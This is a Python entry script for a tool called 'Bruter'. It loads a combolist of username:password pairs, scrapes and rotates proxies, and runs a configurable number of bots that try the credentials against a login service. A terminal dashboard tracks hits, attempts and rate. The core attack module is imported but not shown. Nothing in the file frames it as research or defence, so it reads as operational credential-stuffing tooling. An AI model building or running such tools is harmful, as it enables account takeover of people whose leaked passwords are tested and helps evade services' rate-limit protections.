from module.bruter import Bruter
from module.const import (combos_max, combos_start, proxies_minimum)
from module.proxy_manager import ProxyManager
from module.proxy_scraper import ProxyScraper

import argparse
from asciimatics.screen import Screen
from collections import deque
from threading import Thread
from time import (sleep, time)


def create_combo_queue(input_combo_file):
    queue = deque()
    combo_count = 0

    with open(input_combo_file, 'r', encoding='utf-8', errors='ignore') as combo_file:
        for combo in combo_file:
            if ':' in combo:
                combo_count += 1
                
                if combo_count < combos_start:
                    continue
                
                if combo_count > combos_max:
                    return queue
                
                combo = combo.replace('\n', '').replace('\r', '').replace('\t', '')
                combo_parts = combo.split(':')
                queue.append([combo_parts[0], combo_parts[1]])

    return queue


def screen_clear(screen, lines):
    for i in range(lines):
        screen.print_at(' ' * 80, 0, i)

    
def main(screen):

    parser = argparse.ArgumentParser()
    parser.add_argument('combo_file', help='The path to your combolist', type=str)
    parser.add_argument('proxy_file', help='The path to your proxylist', type=str)
    parser.add_argument('bots', help='How many bots you want to use', type=int)
    args = parser.parse_args()
    
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Creating Combo Queue', 2, 1)
    screen.refresh()
    combo_queue = create_combo_queue(args.combo_file)
    
    screen_clear(screen, 2)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Getting Proxies', 2, 1)
    screen.refresh()
    proxy_scraper = ProxyScraper(args.proxy_file)
    proxy_scraper.scrape()

    proxy_manager = ProxyManager()
    proxy_manager.put(proxy_scraper.get())
    proxy_manager_thread = Thread(target=proxy_manager.start)
    proxy_manager_thread.daemon = True
    proxy_manager_thread.start()

    screen_clear(screen, 2)
    screen.print_at('Bruter Status:' + ' ' * 2 + 'Starting Bots', 2, 1)
    screen.refresh()
    engine = Bruter(args.bots, combo_queue, proxy_manager)
    engine.start()

    tested_per_min = 0
    attempts_per_min = 0
    tested_before_last_min = 0
    attempts_before_last_min = 0
    tested_per_min_list = deque(maxlen=5)
    attempts_per_min_list = deque(maxlen=5)

    time_start = time()
    time_checked = time_start

    try:
        while len(combo_queue):
            time_running = time() - time_start
            hours, rem = divmod(time_running, 3600)
            minutes, seconds = divmod(rem, 60)
            time_running_format = '{:0>2}:{:0>2}:{:05.2f}'.format(int(hours), int(minutes), seconds)

            screen_clear(screen, 13)
            screen.print_at('Bruter Status:' + ' ' * 2 + 'Running', 2, 1)
            screen.print_at('Time:' + ' ' * 11 + time_running_format, 2, 3)
            screen.print_at('Bots:' + ' ' * 11 + str(len(engine.bots)), 2, 4)
            screen.print_at('Hits:' + ' ' * 11 + str(engine.hits), 2, 5)
            screen.print_at('Combos:' + ' ' * 9 + str(len(combo_queue)), 2, 6)
            screen.print_at('Proxies:' + ' ' * 8 + str(proxy_manager.size), 2, 7)
            screen.print_at('Last Combo:' + ' ' * 5 + str(engine.last_combo[0]) + ':' + str(engine.last_combo[1]), 2, 8)
            screen.print_at('Tested:' + ' ' * 9 + str(engine.tested), 2, 10)
            screen.print_at('Attempts:' + ' ' * 7 + str(engine.tested + engine.retries), 2, 11)
            screen.print_at('Tested/min:' + ' ' * 5 + str(tested_per_min), 2, 12)
            screen.print_at('Attempts/min:' + ' ' * 3 + str(attempts_per_min), 2, 13)
            screen.refresh()

            if (time() - time_checked) >= 60:
                time_checked = time()
                tested_last_min = engine.tested - tested_before_last_min
                attempts_last_min = (engine.tested + engine.retries) - attempts_before_last_min
                tested_per_min_list.append(tested_last_min)
                attempts_per_min_list.append(attempts_last_min)
                tested_per_min = round(sum(tested_per_min_list) / len(tested_per_min_list), 2)
                attempts_per_min = round(sum(attempts_per_min_list) / len(attempts_per_min_list), 2)
                tested_before_last_min = engine.tested
                attempts_before_last_min = (engine.tested + engine.retries)

            if proxy_manager.size < proxies_minimum:
                screen_clear(screen, 2)
                screen.print_at('Bruter Status:' + ' ' * 2 + 'Getting Proxies', 2, 1)
                screen.refresh()
                proxy_scraper.scrape()
                proxy_manager.put(proxy_scraper.get())

            sleep(0.25)
            
        raise(KeyboardInterrupt)

    except KeyboardInterrupt:
        screen_clear(screen, 2)
        screen.print_at('Bruter Status:' + ' ' * 2 + 'Stopping', 2, 1)
        screen.refresh()
        engine.stop()
        proxy_manager.stop()
        proxy_manager_thread.join()

    exit()


if __name__ == '__main__':
    Screen.wrapper(main)
